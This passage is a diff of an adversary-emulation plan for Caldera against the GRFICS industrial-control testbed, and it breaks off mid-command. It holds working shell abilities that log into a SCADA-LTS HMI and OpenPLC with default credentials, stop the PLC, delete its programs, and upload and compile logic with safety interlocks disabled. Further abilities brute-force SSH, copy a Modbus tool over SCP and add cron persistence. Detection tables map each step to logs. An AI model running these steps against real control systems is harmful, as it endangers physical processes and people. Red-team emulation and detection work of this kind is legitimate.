-| 9 | Denial of View | T0815 | Impact | Corrupt or replace the HMI dashboard to prevent real monitoring | Complete operator blindness |
+| 1 | Default Credentials | T0812 | Lateral Movement | `j_spring_security_check` + `login.htm` fallback; session `/tmp/hmi_cookies.txt` | Full administrative HMI access |
+| 2 | Graphical User Interface | T0823 | Execution | Navigate SCADA-LTS web UI (`data_sources.shtm`, `views.shtm`) | Understand operator's visual display |
+| 3 | Execution through API | T0871 | Execution | Fetch authenticated **HTML** pages (`data_sources.shtm`, `events.shtm`) — *API label kept for MITRE mapping* | Structured recon without assuming JSON APIs |
+| 4 | Theft of Operational Information | T0882 | Impact | Repeated `watch_list.shtm` snapshots (6 cycles) | Shadow copy of operator-visible HTML / embedded values |
+| 5 | Automated Collection | T0802 | Collection | Poll `watch_list.shtm` every 5s | Real-time attacker-side collection of HMI-rendered content |
+| 6 | Modify Alarm Settings | T0838 | Inhibit Response | Load `event_handlers.shtm`, `compound_events.shtm` — confirm UI reachability | Baseline for real threshold changes via UI or DevTools-captured POSTs |
+| 7 | Alarm Suppression | T0878 | Inhibit Response | *(Narrative)* Disable handlers in UI — not automated in stock plugin | No alerts reach operators |
+| 8 | Manipulation of View | T0832 | Impact | Load `views.shtm` — confirm graphical UI access | *Narrative* false-normal display requires UI/scripting |
+| 9 | Denial of View | T0815 | Impact | *(Narrative)* Corrupt dashboard — combine with manual UI | Complete operator blindness |
 
 #### Caldera Implementation
 
@@ -1558,7 +1629,9 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
 
 - id: a7b8c9d0-7777-7777-7777-000000000001
   name: SCADA-LTS - API Data Source Enumeration
-  description: Enumerate data sources and points via SCADA-LTS API
+  description: |
+    Stock Scada-LTS does not expose /api/datasources at root. Fetches authenticated HTML
+    pages (data_sources.shtm, events.shtm). Requires HMI login ability first (/tmp/hmi_cookies.txt).
   tactic: execution
   technique_id: T0871
   technique_name: Execution through API
@@ -1566,19 +1639,13 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
   - platform: linux
     name: sh
     command: >
-      HMI="http://192.168.90.107:8080" &&
-      curl -s -c /tmp/hmi.jar
-      -d "username=admin&password=admin"
-      "$HMI/login.htm" -o /dev/null &&
-      echo "=== Data Sources ===" &&
-      curl -s -b /tmp/hmi.jar "$HMI/api/datasources" 2>/dev/null &&
-      echo "" &&
-      echo "=== Data Points ===" &&
-      curl -s -b /tmp/hmi.jar "$HMI/api/datapoints" 2>/dev/null &&
-      echo "" &&
-      echo "=== Views ===" &&
-      curl -s -b /tmp/hmi.jar "$HMI/api/views" 2>/dev/null &&
-      echo "ENUMERATION_COMPLETE"
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/data_sources.shtm" -o /tmp/hmi_ds.html &&
+      echo "=== data_sources.shtm (lines) ===" &&
+      wc -l /tmp/hmi_ds.html &&
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/events.shtm" -o /tmp/hmi_ev.html &&
+      echo "=== events.shtm (lines) ===" &&
+      wc -l /tmp/hmi_ev.html &&
+      echo "HMI_ENUMERATION_COMPLETE"
     timeout: 60
 ```
 
@@ -1590,7 +1657,7 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
 - id: a7b8c9d0-7777-7777-7777-000000000002
   name: SCADA-LTS - Automated Process Data Theft
   description: |
-    Poll data points for 1 minute (6 cycles) instead of 2 minutes
+    Polls watch_list.shtm (HTML) every 5s — no JSON API assumed. Session /tmp/hmi_cookies.txt.
   tactic: collection
   technique_id: T0802
   technique_name: Automated Collection
@@ -1598,17 +1665,14 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
   - platform: linux
     name: sh
     command: >
-      HMI="http://192.168.90.107:8080" &&
-      curl -s -c /tmp/hmi.jar
-      -d "username=admin&password=admin"
-      "$HMI/login.htm" -o /dev/null &&
       for cycle in 1 2 3 4 5 6; do
         echo "[Cycle $cycle]" &&
-        curl -s -b /tmp/hmi.jar "$HMI/api/pointValues/latest" 2>/dev/null &&
-        echo "" && sleep 5;
+        curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/watch_list.shtm" -o /tmp/hmi_poll_$cycle.html &&
+        wc -c /tmp/hmi_poll_$cycle.html &&
+        sleep 5;
       done &&
       echo "DATA_COLLECTION_COMPLETE"
-    timeout: 60
+    timeout: 90
 ```
 
 **Ability: Modify Alarm Thresholds**
@@ -1619,9 +1683,9 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
 - id: a7b8c9d0-7777-7777-7777-000000000003
   name: SCADA-LTS - Raise Alarm Thresholds to Disable Alerts
   description: |
-    Use SCADA-LTS API to modify alarm settings on pressure and
-    level data points, raising thresholds so high that no alarm
-    will ever trigger during the attack.
+    REST endpoints for alarm mutation vary by version. This ability verifies access to
+    event-handling UI (event_handlers.shtm, compound_events.shtm). For real threshold
+    changes, use the web UI or scripted POSTs captured from browser DevTools.
   tactic: inhibit-response-function
   technique_id: T0838
   technique_name: Modify Alarm Settings
@@ -1629,15 +1693,11 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
   - platform: linux
     name: sh
     command: >
-      HMI="http://192.168.90.107:8080/ScadaBR" &&
-      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/event-detectors"
-      -H "Content-Type: application/json"
-      -d '{"highLimit": 999999, "lowLimit": -999999, "alarmLevel": "NONE"}'
-      2>/dev/null &&
-      echo "ALARM_THRESHOLDS_RAISED" &&
-      curl -s -b /tmp/hmi.jar -X POST "$HMI/api/event-handlers/disable-all"
-      2>/dev/null &&
-      echo "ALARM_HANDLERS_DISABLED"
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/event_handlers.shtm" -o /tmp/hmi_eh.html &&
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/compound_events.shtm" -o /tmp/hmi_ce.html &&
+      grep -qiE "Event|Handler|Alarm|detector" /tmp/hmi_eh.html &&
+      echo "HMI_ALARM_UI_REACHABLE" || echo "HMI_ALARM_UI_UNCERTAIN"
+    timeout: 45
 ```
 
 **Ability: Manipulate SCADA View**
@@ -1648,9 +1708,9 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
 - id: a7b8c9d0-7777-7777-7777-000000000004
   name: SCADA-LTS - Manipulate Operator View
   description: |
-    Modify the TenEastView1 graphical view in SCADA-LTS to display
-    static "normal" values by changing JavaScript formatters in the
-    ScriptComponents to return hardcoded safe values instead of live data.
+    Graphical view JSON APIs are not stable in stock Scada-LTS. This step fetches
+    views.shtm (authenticated) to confirm UI access; real view manipulation requires
+    UI export/import or Mango scripting.
   tactic: impact
   technique_id: T0832
   technique_name: Manipulation of View
@@ -1658,16 +1718,11 @@ Combine brute force writes with spoofed sensor values on Tank (.14) to mask the 
   - platform: linux
     name: sh
     command: >
-      HMI="http://192.168.90.107:8080/ScadaBR" &&
-      curl -s -b /tmp/hmi.jar "$HMI/api/views" -o /tmp/views.json &&
-      echo "Current views captured." &&
-      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/views/1"
-      -H "Content-Type: application/json"
-      -d '{"components":[{"script":"return \"2450.0 kPa\""},
-           {"script":"return \"65.0%\""},
-           {"script":"return \"NORMAL\""}]}'
-      2>/dev/null &&
-      echo "VIEW_MANIPULATED: Operators now see false-normal values"
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/views.shtm" -o /tmp/hmi_views.html &&
+      wc -l /tmp/hmi_views.html &&
+      grep -qiE "view|graphic|component" /tmp/hmi_views.html &&
+      echo "HMI_VIEWS_PAGE_REACHABLE" || echo "HMI_VIEWS_UNCERTAIN"
+    timeout: 45
 ```
 
 **Step 3: Adversary Profile**
@@ -1696,10 +1751,10 @@ atomic_ordering:
 
 | Step | Log Source | What to Observe | Detection Data Component |
 |------|-----------|-----------------|-------------------------|
-| HMI login | HMI Catalina (`shared_logs/hmi/catalina`) | POST /login.htm from attacker IP | DC0067 (Logon Session Creation) |
-| API calls | HMI Catalina access log | GET/PUT /api/* requests from non-operator IP | DC0038 (Application Log Content) |
-| Alarm modification | HMI Catalina, supervisor | PUT /api/event-detectors, config change | DC0061 (File Modification) |
-| View manipulation | HMI Catalina | PUT /api/views/1 modifying display components | DC0038 (Application Log Content) |
+| HMI login | HMI Catalina (`shared_logs/hmi/catalina`) | POST /j_spring_security_check, /login.htm; GET /watch_list.shtm | DC0067 (Logon Session Creation) |
+| HTML recon / polling | HMI Catalina access log | GET /data_sources.shtm, /watch_list.shtm, /views.shtm from non-operator IP | DC0038 (Application Log Content) |
+| Alarm UI | HMI Catalina | GET /event_handlers.shtm, /compound_events.shtm | DC0038 (Application Log Content) |
+| View page | HMI Catalina | GET /views.shtm | DC0038 (Application Log Content) |
 | Simultaneous Modbus attack | Router Suricata | FC=0x06 writes coinciding with HMI API tampering | DC0085 (Network Traffic Content) |
 | No alarm triggers | ABSENCE in HMI logs | Expected alarms do NOT appear despite process deviations | DC0109 (Process/Event Alarm) |
 
@@ -1731,10 +1786,10 @@ If API-based modification fails, directly manipulate the SCADA-LTS MariaDB datab
 
 #### Assumptions
 
-- SCADA-LTS REST API is accessible with admin credentials at `admin:admin`
-- SCADA-LTS has a view named `TenEastView1` with ScriptComponent data points
-- API endpoints for views, data sources, event detectors, and users exist (SCADA-LTS 2.7.x provides REST API)
-- No API rate limiting or additional authentication beyond session cookies
+- SCADA-LTS is reachable with `admin:admin`; Spring Security (`j_spring_security_check`) and legacy `login.htm` are both handled by the login ability.
+- Authenticated **`.shtm`** pages (`data_sources.shtm`, `watch_list.shtm`, `events.shtm`, `views.shtm`, alarm pages) are the reliable automation surface for the GRFICS container build; root **`/api/*`** JSON routes are **not** assumed.
+- Real alarm threshold edits and graphical view manipulation are **operator/UI or DevTools-captured POST** workflows; the stock plugin only proves page reachability.
+- No additional rate limiting beyond Tomcat defaults; session cookies in `/tmp/hmi_cookies.txt` are shared across abilities in one operation.
 
 ---
 
@@ -1984,14 +2039,14 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
 | Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
 |------|---------------|-------------|--------|----------------|--------------------------|
 | 1 | Hardcoded Credentials | T0891 | Persistence | OpenPLC ships with `openplc:openplc` baked into `openplc.db` | Use hardcoded default credentials |
-| 2 | Execution through API | T0871 | Execution | Use OpenPLC REST API to query runtime status | Programmatic PLC management |
-| 3 | Detect Operating Mode | T0868 | Collection | `GET /runtime_status` to check RUN/STOP mode | Confirm PLC is running before attack |
-| 4 | Change Operating Mode | T0858 | Execution/Evasion | `POST /stop-plc` to halt PLC execution | PLC stops running; valves freeze at last position |
-| 5 | Program Upload | T0845 | Collection | `GET /get-program-body` to download current ST program | Exfiltrate legitimate PLC logic for analysis |
-| 6 | Data Destruction | T0809 | Inhibit Response | `POST /delete-program` to remove all PLC programs | Legitimate control logic destroyed |
-| 7 | Masquerading | T0849 | Evasion | Name malicious ST file identically to legitimate (`326339.st`) | Attack logic appears as legitimate program |
-| 8 | Modify Program | T0889 | Persistence | Upload masqueraded program with disabled safety interlocks | Malicious logic installed as "legitimate" program |
-| 9 | Change Operating Mode | T0858 | Execution | `POST /start-plc` to restart with malicious logic | PLC runs attacker's code |
+| 2 | Execution through API | T0871 | Execution | `GET /dashboard` and `GET /programs` with session cookie | Programmatic PLC management (HTML, not JSON) |
+| 3 | Detect Operating Mode | T0868 | Collection | `GET /dashboard` + `GET /programs` — parse Running/Stopped and `*.st` names | Confirm PLC state before attack |
+| 4 | Change Operating Mode | T0858 | Execution/Evasion | `GET /stop_plc` to halt PLC execution | PLC stops running; valves freeze at last position |
+| 5 | Program Upload | T0845 | Collection | `GET /programs` — parse `*.st` from HTML (no raw ST GET) | Enumerate deployed programs for analysis |
+| 6 | Data Destruction | T0809 | Inhibit Response | `GET /remove-program?id=<Prog_ID>` for each ID parsed from `/programs` | Legitimate control logic destroyed |
+| 7 | Masquerading | T0849 | Evasion | Local file `326339.st` uploaded; server stores random `*.st` — same two-step flow as Chain 2 | Malicious logic registered under attacker-chosen label |
+| 8 | Modify Program | T0889 | Persistence | `/upload-program` then `/upload-program-action`; `/tmp/plc_last_st_file.txt` for compile | Malicious logic installed |
+| 9 | Change Operating Mode | T0858 | Execution | `GET /compile-program?file=<name>` then `GET /start_plc` | PLC runs attacker's code |
 | 10 | Loss of Protection | T0837 | Impact | Pressure_override disabled, run_bit safety bypassed | No safety functions operational |
 
 #### Caldera Implementation
@@ -2004,8 +2059,8 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
 - id: c9d0e1f2-9999-9999-9999-000000000001
   name: OpenPLC - Detect Operating Mode via API
   description: |
-    Query the OpenPLC web API to determine current runtime status
-    (running/stopped), active program name, and protocol states.
+    Query dashboard and /programs (session: /tmp/plc_cookies.txt — run OpenPLC login first).
+    Uses POSIX grep -E instead of grep -P for Alpine/busybox compatibility.
   tactic: collection
   technique_id: T0868
   technique_name: Detect Operating Mode
@@ -2013,15 +2068,16 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
   - platform: linux
     name: sh
     command: >
-      curl -s -c /tmp/plc.jar -X POST "http://192.168.95.2:8080/login"
-      -d "username=openplc&password=openplc" -L -o /dev/null &&
-      echo "=== Runtime Status ===" &&
-      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/dashboard" |
-      grep -oP '(Running|Stopped|Program|Status).*?<' | head -5 &&
-      echo "=== Programs ===" &&
-      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/programs" |
-      grep -oP '[0-9]+\.st' | sort -u &&
+      curl -s -c /tmp/plc_cookies.txt -d "username=openplc&password=openplc"
+      "http://192.168.95.2:8080/login" -o /dev/null &&
+      echo "=== Runtime Status (dashboard snippet) ===" &&
+      curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/dashboard" |
+      grep -E "Running|Stopped|Program|Status|OpenPLC" | head -8 &&
+      echo "=== Programs (.st names) ===" &&
+      curl -s -b /tmp/plc_cookies.txt "http://192.168.95.2:8080/programs" |
+      grep -oE '[0-9]+\.st' | sort -u &&
       echo "PLC_MODE_DETECTED"
+    timeout: 60
 ```
 
 **Ability: Stop PLC Runtime**
@@ -2031,7 +2087,7 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
 
 - id: c9d0e1f2-9999-9999-9999-000000000002
   name: OpenPLC - Change Operating Mode to STOP
-  description: Stop the PLC runtime via the correct API endpoint
+  description: Stop the PLC runtime via GET /stop_plc (GRFICS OpenPLC webserver.py).
   tactic: execution
   technique_id: T0858
   technique_name: Change Operating Mode
@@ -2040,15 +2096,14 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
     name: sh
     command: >
       curl -s -b /tmp/plc_cookies.txt
-      -d ""
       "http://192.168.95.2:8080/stop_plc"
-      -o /tmp/stop_result.html -w "%{http_code}" &&
+      -o /tmp/stop_result.html -w "STOP_HTTP=%{http_code}\n" &&
       echo "PLC_STOP_REQUESTED" &&
       sleep 2 &&
       curl -s -b /tmp/plc_cookies.txt
       "http://192.168.95.2:8080/dashboard"
       -o /tmp/plc_status.html &&
-      grep -qi "stopped" /tmp/plc_status.html &&
+      grep -qi "stopped\|Stopped" /tmp/plc_status.html &&
       echo "PLC_STOPPED" || echo "PLC_STOP_UNCERTAIN"
     timeout: 60
 ```
@@ -2061,8 +2116,8 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
 - id: c9d0e1f2-9999-9999-9999-000000000003
   name: OpenPLC - Download Active Program
   description: |
-    Download the active program via the programs page.
-    The /get-program-body endpoint may not exist; use /programs page parsing.
+    Stock OpenPLC does not expose a simple GET for raw .st bodies. This step collects
+    the authenticated /programs HTML for program names (same as b2c3d4e5 collection).
   tactic: collection
   technique_id: T0845
   technique_name: Program Upload
@@ -2074,12 +2129,8 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
       "http://192.168.95.2:8080/programs"
       -o /tmp/programs_page.html &&
       echo "=== Programs Found ===" &&
-      grep -oP '[0-9]+\.st' /tmp/programs_page.html | sort -u &&
-      echo "=== Attempting direct download ===" &&
-      curl -s -b /tmp/plc_cookies.txt
-      "http://192.168.95.2:8080/programs"
-      -o /tmp/plc_programs.html &&
-      wc -l /tmp/plc_programs.html &&
+      grep -oE '[0-9]+\.st' /tmp/programs_page.html | sort -u &&
+      wc -l /tmp/programs_page.html &&
       echo "PROGRAM_ENUMERATED"
     timeout: 60
 ```
@@ -2092,7 +2143,8 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
 - id: c9d0e1f2-9999-9999-9999-000000000004
   name: OpenPLC - Data Destruction of PLC Programs
   description: |
-    Delete programs via the correct /remove-program endpoint.
+    remove-program expects query id= (Prog_ID), not program_name. This ability parses
+    /programs for remove-program?id= links, then GETs each remove-program URL.
   tactic: inhibit-response-function
   technique_id: T0809
   technique_name: Data Destruction
@@ -2100,15 +2152,19 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
   - platform: linux
     name: sh
     command: >
-      for prog in 326339.st 690525.st 655326.st blank_program.st; do
+      curl -s -b /tmp/plc_cookies.txt
+      "http://192.168.95.2:8080/programs"
+      -o /tmp/programs_for_delete.html &&
+      IDS=$(grep -oE 'remove-program[?]id=[0-9]+' /tmp/programs_for_delete.html | sed 's/.*id=//' | sort -u) &&
+      echo "IDS=$IDS" &&
+      for id in $IDS; do
         curl -s -b /tmp/plc_cookies.txt
-        -d "program_name=$prog"
-        "http://192.168.95.2:8080/remove-program"
-        -o /dev/null;
-        echo "DELETED: $prog";
+        "http://192.168.95.2:8080/remove-program?id=$id"
+        -o /dev/null &&
+        echo "REMOVE_REQUEST id=$id";
       done &&
-      echo "ALL_PROGRAMS_DESTROYED"
-    timeout: 60
+      echo "PROGRAM_DELETE_ATTEMPTS_DONE"
+    timeout: 120
 ```
 
 **Ability: Upload Masqueraded Malicious Program**
@@ -2119,7 +2175,9 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
 - id: c9d0e1f2-9999-9999-9999-000000000005
   name: OpenPLC - Upload Masqueraded Malicious Logic
   description: |
-    Upload malicious program named identically to legitimate one (326339.st)
+    Same two-step upload as b2c3d4e5-2222-2222-2222-000000000003: /upload-program then
+    /upload-program-action. Local file named 326339.st is stored under a random server
+    name; filename for compile is written to /tmp/plc_last_st_file.txt.
   tactic: evasion
   technique_id: T0849
   technique_name: Masquerading
@@ -2147,12 +2205,21 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
       printf '    PROGRAM instance0 WITH task0 : main1;\n' >> /tmp/326339.st &&
       printf '  END_RESOURCE\n' >> /tmp/326339.st &&
       printf 'END_CONFIGURATION\n' >> /tmp/326339.st &&
-      curl -s -b /tmp/plc_cookies.txt
-      -F "file=@/tmp/326339.st"
-      "http://192.168.95.2:8080/upload-program-action"
-      -o /tmp/upload.html -w "%{http_code}" &&
-      echo "MASQUERADED_PROGRAM_UPLOADED"
-    timeout: 60
+      curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/326339.st"
+      "http://192.168.95.2:8080/upload-program"
+      -o /tmp/plc_upload_form_masq.html &&
+      FN=$(grep -oE '[0-9]+\.st' /tmp/plc_upload_form_masq.html | head -1) &&
+      echo "PARSED_ST_FILENAME=$FN" &&
+      test -n "$FN" &&
+      curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action"
+      -d "prog_name=326339_clone"
+      -d "prog_descr=masquerade"
+      -d "prog_file=$FN"
+      -d "epoch_time=$(date +%s)"
+      -o /tmp/plc_upload_action_masq.html &&
+      echo "$FN" > /tmp/plc_last_st_file.txt &&
+      echo "MASQUERADED_UPLOAD_DONE"
+    timeout: 120
 ```
 
 **Ability: Compile and Restart PLC with Malicious Logic**
@@ -2162,7 +2229,9 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
 
 - id: c9d0e1f2-9999-9999-9999-000000000006
   name: OpenPLC - Start PLC with Uploaded Logic
-  description: Compile and start the PLC runtime
+  description: |
+    GET /compile-program?file=<st> then GET /start_plc. Uses /tmp/plc_last_st_file.txt
+    from the masquerade upload ability.
   tactic: execution
   technique_id: T0858
   technique_name: Change Operating Mode
@@ -2170,18 +2239,19 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
   - platform: linux
     name: sh
     command: >
+      FN=$(cat /tmp/plc_last_st_file.txt 2>/dev/null) &&
+      echo "COMPILE_FILE=$FN" &&
+      test -n "$FN" &&
       curl -s -b /tmp/plc_cookies.txt
-      -d "program_name=326339.st"
-      "http://192.168.95.2:8080/compile-program"
-      -o /tmp/compile.html &&
-      echo "COMPILATION_STARTED" &&
+      "http://192.168.95.2:8080/compile-program?file=$FN"
+      -o /tmp/compile_masq.html &&
+      echo "COMPILATION_TRIGGERED" &&
       sleep 15 &&
       curl -s -b /tmp/plc_cookies.txt
-      -d ""
       "http://192.168.95.2:8080/start_plc"
-      -o /tmp/start.html &&
-      echo "PLC_STARTED"
-    timeout: 120
+      -o /tmp/start_masq.html &&
+      echo "PLC_START_TRIGGERED"
+    timeout: 180
 ```
 
 **Step 3: Adversary Profile**
@@ -2213,15 +2283,15 @@ atomic_ordering:
 | PLC login | PLC auth.log | HTTP auth from attacker IP | DC0067 (Logon Session) |
 | Runtime query | PLC syslog/daemon | GET /dashboard from external IP | DC0038 (Application Log) |
 | PLC stop | PLC daemon.log, plc_app | OpenPLC runtime process terminated | DC0033 (Process Termination) |
-| Program deletion | PLC audit, syslog | File unlink operations on .st files | DC0040 (File Deletion) |
-| Program upload | PLC syslog, audit | POST /upload-program, new file creation | DC0039 (File Creation) |
-| Compilation | PLC syslog | compile_program.sh, matiec compiler execution | DC0032 (Process Creation) |
-| PLC start | PLC daemon.log | OpenPLC runtime process started | DC0032 (Process Creation) |
+| Program deletion | PLC audit, syslog | GET /remove-program?id=... for each parsed Prog_ID | DC0040 (File Deletion) |
+| Program upload | PLC syslog, audit | POST /upload-program (multipart) then POST /upload-program-action | DC0039 (File Creation) |
+| Compilation | PLC syslog | GET /compile-program?file=<random>.st, `compile_program.sh`, matiec | DC0032 (Process Creation) |
+| PLC start | PLC daemon.log | GET /start_plc — OpenPLC runtime process started | DC0032 (Process Creation) |
 | Safety loss | Simulation process_alarms | Process without safety interlocks | DC0109 (Process/Event Alarm) |
 
 #### Assumptions
 
-- OpenPLC web API endpoints (`/stop-plc`, `/start-plc`, `/upload-program`, `/compile-program`, `/delete-program`) are accessible with valid session
+- OpenPLC web routes (`/stop_plc`, `/start_plc`, `/upload-program`, `/upload-program-action`, `/compile-program?file=`, `/remove-program?id=`) match GRFICS `webserver.py` and are reachable with a valid session (`/tmp/plc_cookies.txt` after login).
 - The PLC persistent volume (`plc_volume`) stores programs at `/docker_persistent/st_files/`
 - Program compilation takes approximately 10-15 seconds
 
@@ -2274,7 +2344,7 @@ atomic_ordering:
 - b8c9d0e1-8888-8888-8888-000000000002  # Stop Suricata IDS
 - b8c9d0e1-8888-8888-8888-000000000003  # Clear router logs
 - c3d4e5f6-3333-3333-3333-000000000001  # HMI login
-- a7b8c9d0-7777-7777-7777-000000000003  # Disable HMI alarms
+- a7b8c9d0-7777-7777-7777-000000000003  # HMI alarm / event UI reachability (HTML probe)
 # Phase 2: PLC Takeover
 - b2c3d4e5-2222-2222-2222-000000000001  # PLC login
 - c9d0e1f2-9999-9999-9999-000000000001  # Detect PLC operating mode
@@ -2284,7 +2354,7 @@ atomic_ordering:
 - c9d0e1f2-9999-9999-9999-000000000005  # Upload masqueraded malicious program
 - c9d0e1f2-9999-9999-9999-000000000006  # Compile and restart PLC
 # Phase 3: Coordinated Impact
-- a7b8c9d0-7777-7777-7777-000000000004  # Manipulate HMI view
+- a7b8c9d0-7777-7777-7777-000000000004  # HMI views.shtm reachability (HTML probe)
 - c3d4e5f6-3333-3333-3333-000000000003  # Combined Modbus attack + sensor spoof
 - a1b2c3d4-1111-1111-1111-000000000002  # Verify pressure rising
 ```
@@ -2310,20 +2380,428 @@ curl -X POST http://localhost:8888/api/v2/operations \
 
 | Phase | Log Sources | Key Indicators | Data Components |
 |-------|-------------|----------------|-----------------|
-| Phase 1 (Defense) | Router flask, syslog; HMI catalina | Logins from 192.168.90.6 to router and HMI; Suricata process killed; alarm config changed | DC0067, DC0033, DC0038, DC0061 |
-| Phase 2 (PLC) | PLC auth, syslog, daemon, audit, plc_app | Login to PLC web; program download; runtime stop; file deletion; new upload; compilation; restart | DC0067, DC0033, DC0039, DC0040, DC0032 |
+| Phase 1 (Defense) | Router flask, syslog; HMI catalina | Logins from 192.168.90.6 to router and HMI; Suricata rules cleared; HMI alarm/view HTML pages fetched (probe) | DC0067, DC0033, DC0038, DC0061 |
+| Phase 2 (PLC) | PLC auth, syslog, daemon, audit, plc_app | Login to PLC web; /programs enumeration; runtime stop; remove-program?id=; two-step upload; compile?file=; start_plc | DC0067, DC0033, DC0039, DC0040, DC0032 |
 | Phase 3 (Impact) | Simulation process_alarms, supervisor; Router eve.json (if IDS was restarted); HMI catalina | Modbus writes from attacker IP; pressure deviations; view modification; no alarms despite dangerous conditions | DC0109, DC0108, DC0082, DC0085 |
+
+---
+
+### Chain 11: SSH Foothold on EWS — Trusted Modbus Execution and Cron Persistence
+
+**Adversary Profile**: Red-team operator with DMZ access only (Kali agent) who obtains **SSH** access to the engineering workstation using **`engineer`** / **`plc123`**, after a short password-guessing phase. The attacker **does not** rely on noVNC (contrast Chain 5). They **SCP** `modbus_cli` onto the EWS, run Modbus reads **remotely over SSH** (so the binary executes **on the EWS** with source IP **192.168.95.5**), then apply sustained pressure excursion writes and install a **cron** job for periodic purge valve manipulation.
+
+**Kill Chain Summary**: DMZ C2 (Kali) → SSH brute simulation → valid SSH session → lateral tool transfer (SCP) → collection (remote execution) → impact (remote Modbus writes from trusted IP) → persistence (cron on EWS)
+
+#### Technique Mapping
+
+| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
+|------|---------------|-------------|--------|----------------|--------------------------|
+| 1 | Exploit Public-Facing Application | T0819 | Initial Access | Sandcat on Kali beacons to Caldera | C2 from attacker host |
+| 2 | Exploitation of Remote Services | T0866 | Initial Access | Failed SSH with `wrongpass1` / `wrongpass2`, then success with `plc123` | Realistic auth noise then shell access |
+| 3 | Lateral Tool Transfer | T0867 | Lateral Movement | `scp ./modbus_cli engineer@192.168.95.5:/tmp/` | Modbus tool present on EWS |
+| 4 | Monitor Process State | T0801 | Collection | SSH remote: `/tmp/modbus_cli 192.168.95.14 read_ir 1 2` | Baseline tank pressure/level |
+| 5 | Manipulation of Control | T0831 | Inhibit Response | SSH remote loops: purge HR 0, feed HR 65535 | Pressure excursion |
+| 6 | Remote Services | T0886 | Persistence | `crontab` with periodic `/tmp/modbus_cli ... write_r` | Repeating purge closure every 15 min |
+
+#### Caldera Implementation
+
+**Prerequisites**: `sshpass` on the Kali agent; OpenSSH client; router forwarding DMZ ↔ ICS (default). **Group**: `red` (Kali only).
+
+**Step 1: Deploy agent on Kali** (same as Chain 1).
+
+**Step 2: Create abilities** (YAML files under `plugins/modbus/data/abilities/`; tactic folders: `credential-access`, `lateral-movement`, `collection`, `impair-process-control`, `persistence`).
+
+**Ability: SSH brute simulation then valid login**
+
+```yaml
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000001
+  name: SSH to EWS - Brute Simulation then Valid Login
+  description: |
+    From the Kali attacker host (DMZ), attempts two deliberately wrong SSH passwords
+    against the GRFICS engineering workstation (192.168.95.5), then authenticates
+    with engineer:plc123. Requires sshpass on the agent (apt-get install sshpass if missing).
+  tactic: initial-access
+  technique_id: T0866
+  technique_name: Exploitation of Remote Services
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 ||
+      { echo "ERROR: sshpass not found — install with: apt-get update && apt-get install -y sshpass"; exit 1; } &&
+      EWS=192.168.95.5 &&
+      for bad in wrongpass1 wrongpass2; do
+        sshpass -p "$bad" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+        -o ConnectTimeout=8 engineer@${EWS} 'exit 0' 2>/dev/null &&
+        echo "UNEXPECTED_SUCCESS:$bad" ||
+        echo "EXPECTED_FAIL:$bad";
+      done &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      -o ConnectTimeout=10 engineer@${EWS}
+      'echo SSH_SESSION_OK; hostname; whoami; uptime' &&
+      echo "SSH_LOGIN_SUCCESS"
+    timeout: 120
+```
+
+**Ability: SCP modbus_cli from Kali to EWS**
+
+```yaml
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000002
+  name: SCP modbus_cli from Kali to EWS over SSH
+  description: |
+    Copies ./modbus_cli (from prior Caldera payload download on Kali) to /tmp/modbus_cli
+    on 192.168.95.5 using engineer:plc123. Run e5f6a7b8-5555-5555-5555-000000000002 first.
+  tactic: lateral-movement
+  technique_id: T0867
+  technique_name: Lateral Tool Transfer
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      test -x ./modbus_cli ||
+      { echo "ERROR: ./modbus_cli missing — run Lateral Transfer Modbus CLI download first"; exit 1; } &&
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      ./modbus_cli engineer@192.168.95.5:/tmp/modbus_cli &&
